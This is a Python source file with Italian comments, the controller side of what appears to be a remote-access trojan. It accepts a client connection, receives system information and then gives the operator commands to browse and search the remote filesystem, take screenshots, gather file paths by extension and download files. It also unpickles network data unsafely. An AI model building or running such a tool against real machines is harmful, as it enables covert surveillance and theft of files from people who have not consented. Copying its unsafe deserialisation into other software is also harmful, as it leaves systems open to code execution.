from socket import *
import signal
import time
import sys
import pickle

IP = "localhost"
PORT = 12000
ADDR = (IP, PORT)
SIZE = 4096
FORMAT = "utf-8"


#gestisce il ctrl-C per l'uscita
def signalHandler(signum,frame):
    msg = "Uscita effettuata con successo"
    print(":", msg, end = "", flush=True)
    exit(1)


def serverConnection():
    try:
        server=socket(AF_INET,SOCK_STREAM)
        server.bind(ADDR)
        server.listen(5)
        print(f"\n[LISTENING] Server is up and it's waiting for a client connection")
        return server
    except:
        print(f"[ERROR] Connection refused")
        exit(1)


#lista dei comandi disponibili per il controllo remoto
def commandsHelp():
    print("#####    Comandi disponibili     ####")
    print()
    print("Download di file:    download <nomeFile.estensione> (txt docx pdf video foto excel cartelle zip ")
    print("Mostra Working Directory:    pwd")
    print("Lista dei file in un percorso:   ls")
    print("Lista di tutti i file (compresi i nascosti) in un percorso:  ls -a")
    print("Cambia posizione:    cd <path>")
    print("Cerca un file in tutto il FileSystem:   find <nomeFile.estensione>")
    print("Cerca un file nel path desiderato:   find <nomeFile.estensione> <Path>")
    print("Effettua screenshot:     screenshot")
    print("Crea un file .txt con i percorsi di tutti i file con una certa estensione:   filespath <nomeFiletxt> <estensione>")
    print("aggiungere di poter usare anche gli altri comandi")
    print("file log")
    print("Esci dal controllo remoto:   exit")
    print()
    print("####################################")


def printInformazioni(clientConnection):

    #Ricezione del file dal Client
    buff=1
    risposta="y"
    nbytes=1

    try:
        while buff and nbytes != '':
            nbytes = clientConnection.recv(1024).decode(FORMAT)
            buff=clientConnection.recv((int(nbytes))).decode(FORMAT)
            nbytes=''
            if buff[0:7] == "[ERROR]":
                risposta=input(buff)
                clientConnection.send((risposta).encode(FORMAT))
                if risposta == "Y" or risposta == "y":
                    buff = 1
                    nbytes= 1
                elif risposta == "N" or risposta == "n":
                    buff = 0
                    break

            print(buff)

        if risposta == "Y" or risposta == "y":
            print(f"[RECEIVING]\n")
        elif risposta == "N" or risposta == "n":
            print(f"[NOT RECEIVING]\n")

    except:
        print("Qualcosa nella print informazioni non ha funzionato\n")


def remoteControl(clientConnection):

    while True:
        #commandsHelp()
        path = clientConnection.recv(1024).decode(FORMAT)
        comando=input(path+"$ ")
        clientConnection.send((comando).encode(FORMAT))

        if comando == "exit":
            print("Procedura di controllo remoto conclusa con successo!")
            break

        elif comando == "ls":
            listdir=pickle.loads(clientConnection.recv(1024))
            print(listdir)

        elif comando[0:8] == "download":
            # Write File in binary
            file = open(comando[10:len(comando)-1], 'wb')

            # Keep receiving data from the server
            line = clientConnection.recv(1024)

            while (line):
                file.write(line)
                line = clientConnection.recv(1024)
            file.close()
            break



def main():
    signal.signal(signal.SIGINT, signalHandler)
    exit = False
    server = serverConnection()

    while exit == False:

        clientConnection, addr = server.accept()
        print(f"[CONNECTED] Client {addr} is connected to the server")

        # ricevo info sul sistema
        printInformazioni(clientConnection)
        time.sleep(4)
        print("[REMOTE CONTROL] Starting procedure...")
        time.sleep(4)
        remoteControl(clientConnection)

        clientConnection.close()
        print(f"[CLOSED] Client Connection closed succesfully!")
        print()
        # Le operazioni sono concluse e decido come procedere
        print(f"[DECISION] Do you want to close the Sever or keep listening for new Clients?")
        print(f"[DECISION] 1 - Keep Listening")
        print(f"[DECISION] 2 - Close Server")
        restartDecision = input("> ")

        if restartDecision == '2':
            exit = True
            print(f"[INFO] The Server was shut down successfully")
            server.close()
            sys.exit(0)
        elif restartDecision == '1':
            print(f"[INFO] The server keeps listening...")
        else:
            clientConnection.close()
            server.close()


if __name__ == "__main__":
    main()

